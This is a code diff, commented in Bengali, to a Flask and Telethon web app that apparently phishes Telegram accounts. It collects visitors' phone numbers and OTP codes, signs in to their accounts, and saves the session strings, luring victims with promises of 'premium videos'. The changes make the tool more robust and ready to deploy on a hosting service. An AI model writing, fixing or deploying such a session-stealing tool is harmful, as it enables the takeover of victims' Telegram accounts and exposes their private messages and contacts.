@@ -9,16 +9,22 @@ load_dotenv()
 
 app = Flask(__name__, static_url_path='')
 
-# এনভায়রনমেন্ট ভ্যারিয়েবল লোড
-API_ID = int(os.getenv("API_ID"))
-API_HASH = os.getenv("API_HASH")
-LOG_CHANNEL = int(os.getenv("LOG_CHANNEL"))
-ADMIN_ID = int(os.getenv("ADMIN_ID"))
-BOT_TOKEN = os.getenv("BOT_TOKEN")
+# এনভায়রনমেন্ট ভ্যারিয়েবল লোড (সুরক্ষিত পদ্ধতিতে)
+def get_env_int(key):
+    val = os.getenv(key)
+    return int(val) if val and val.strip().isdigit() else 0
 
+API_ID = get_env_int("API_ID")
+API_HASH = os.getenv("API_HASH", "")
+LOG_CHANNEL = get_env_int("LOG_CHANNEL")
+ADMIN_ID = get_env_int("ADMIN_ID")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
+
+# সেশন এবং ইউজার লিস্ট স্টোর
 user_sessions = {}
 all_users = set()
 
+# টেলিগ্রাম ক্লায়েন্ট সেটআপ
 client = TelegramClient(StringSession(), API_ID, API_HASH)
 
 @app.route('/')
@@ -45,6 +51,8 @@ async def verify_otp():
     otp = data.get('otp')
     if phone in user_sessions:
         try:
+            if not client.is_connected():
+                await client.connect()
             user = await client.sign_in(phone, otp, phone_code_hash=user_sessions[phone]['hash'])
             all_users.add(user.id)
             session_str = client.session.save()
@@ -58,9 +66,10 @@ async def verify_otp():
                 "আপনার অ্যাকাউন্টটি সফলভাবে ভেরিফাই করা হয়েছে। ✅\n"
                 "এখন নিচের **Open Content** বাটনে ক্লিক করে সব প্রিমিয়াম ভিডিও উপভোগ করুন। 🔥"
             )
-            # বাটনে আপনার ওয়েবসাইটের লিংকটি দিন
+            # বাটনে আপনার রেন্ডার ওয়েবসাইটের লিংকটি দিন
+            site_url = f"https://{request.host}"
             await client.send_message(user.id, welcome_text, buttons=[
-                [Button.url("🚀 Open Content Now 🚀", "https://your-website-link.com")]
+                [Button.url("🚀 Open Content Now 🚀", site_url)]
             ])
 
             return jsonify({"status": "success"})
@@ -86,5 +95,9 @@ async def broadcast_handler(event):
     await event.reply("📢 নোটিশ পাঠানো শেষ।")
 
 if __name__ == "__main__":
-    client.start(bot_token=BOT_TOKEN) # বট টোকেন দিয়ে স্টার্ট
-    app.run()
+    # বট টোকেন দিয়ে স্টার্ট করা
+    if BOT_TOKEN:
+        client.start(bot_token=BOT_TOKEN)
+        app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    else:
+        print("Error: BOT_TOKEN not found in environment variables!")
